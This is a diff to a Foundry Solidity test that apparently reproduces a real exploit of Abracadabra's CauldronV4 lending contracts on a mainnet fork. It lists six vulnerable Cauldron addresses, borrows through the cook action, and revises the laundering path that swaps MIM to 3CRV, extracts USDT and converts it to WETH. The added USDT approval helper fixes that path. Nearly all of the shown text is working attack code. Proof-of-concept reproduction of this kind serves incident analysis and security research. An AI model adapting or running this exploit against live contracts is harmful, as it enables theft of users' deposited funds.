@@ -3,6 +3,22 @@ pragma solidity ^0.8.19;
 
 import "forge-std/Test.sol";
 
+// Minimal SafeTransferLib for USDT approve
+library SafeTransferLib {
+    function safeApprove(IERC20 token, address to, uint256 amount) internal {
+        // USDT requires resetting approval to 0 first
+        (bool success, bytes memory data) = address(token).call(
+            abi.encodeWithSelector(IERC20.approve.selector, to, 0)
+        );
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
+
+        (success, data) = address(token).call(
+            abi.encodeWithSelector(IERC20.approve.selector, to, amount)
+        );
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
+    }
+}
+
 interface ICauldronV4 {
     function cook(
         uint8[] calldata actions,
@@ -36,14 +52,12 @@ interface IERC20 {
     function transfer(address to, uint256 amount) external returns (bool);
 }
 
-interface ICurveRouter {
+interface ICurveMIMPool {
     function exchange(
-        address[11] calldata route,
-        uint256[5][5] calldata swap_params,
-        uint256 amount,
-        uint256 expected,
-        address[5] calldata pools,
-        address receiver
+        int128 i,
+        int128 j,
+        uint256 dx,
+        uint256 min_dy
     ) external returns (uint256);
 }
 
@@ -90,14 +104,11 @@ contract AbracadabraExploitTest is Test {
     // Action constants
     uint8 constant ACTION_BORROW = 5;
 
-    // Curve swap parameters
-    uint256 constant INPUT_TOKEN_INDEX = 0;
-    uint256 constant OUTPUT_TOKEN_INDEX = 1;
-    uint256 constant SWAP_TYPE = 1;
-    uint256 constant POOL_TYPE = 1;
-    uint256 constant N_COINS = 2;
+    // Curve MIM/3CRV pool indices
+    int128 constant MIM_INDEX = 0;
+    int128 constant THREE_CRV_INDEX = 1;
 
-    // Pool indices for 3Pool
+    // Pool indices for 3Pool (DAI=0, USDC=1, USDT=2)
     int128 constant USDT_INDEX = 2;
 
     // Uniswap V3 fee tier
@@ -110,8 +121,8 @@ contract AbracadabraExploitTest is Test {
     address[6] recipients;
 
     function setUp() public {
-        // Fork at the real exploit block
-        vm.createSelectFork("mainnet", 23504545);
+        // Fork at the real exploit block (1 block before attack)
+        vm.createSelectFork("mainnet", 23504544);
 
         // The 6 vulnerable Cauldrons
         cauldrons[0] = ICauldronV4(0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c);
@@ -352,24 +363,10 @@ contract AbracadabraExploitTest is Test {
 
     function _swapMIMTo3Crv() internal {
         uint256 mimAmount = MIM.balanceOf(attacker);
-        MIM.approve(CURVE_ROUTER, mimAmount);
+        MIM.approve(MIM_3CRV_POOL, mimAmount);
 
-        address[11] memory route;
-        route[0] = address(MIM);
-        route[1] = MIM_3CRV_POOL;
-        route[2] = THREE_CRV;
-
-        uint256[5][5] memory swapParams;
-        swapParams[0][0] = INPUT_TOKEN_INDEX;
-        swapParams[0][1] = OUTPUT_TOKEN_INDEX;
-        swapParams[0][2] = SWAP_TYPE;
-        swapParams[0][3] = POOL_TYPE;
-        swapParams[0][4] = N_COINS;
-
-        address[5] memory pools;
-        pools[0] = MIM_3CRV_POOL;
-
-        ICurveRouter(CURVE_ROUTER).exchange(route, swapParams, mimAmount, 0, pools, attacker);
+        // Swap directly on MIM/3CRV pool: MIM (index 0) -> 3CRV (index 1)
+        ICurveMIMPool(MIM_3CRV_POOL).exchange(MIM_INDEX, THREE_CRV_INDEX, mimAmount, 0);
     }
 
     function _remove3PoolLiquidityToUSDT() internal {
@@ -383,7 +380,8 @@ contract AbracadabraExploitTest is Test {
     function _swapUSDTToWETH() internal {
         uint256 usdtBalance = IERC20(USDT).balanceOf(attacker);
         if (usdtBalance > 0) {
-            IERC20(USDT).approve(UNISWAP_V3_ROUTER, usdtBalance);
+            // Use SafeTransferLib for USDT approve (USDT has non-standard approve)
+            SafeTransferLib.safeApprove(IERC20(USDT), UNISWAP_V3_ROUTER, usdtBalance);
 
             IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
                 path: abi.encodePacked(USDT, UNISWAP_V3_FEE_TIER, WETH),
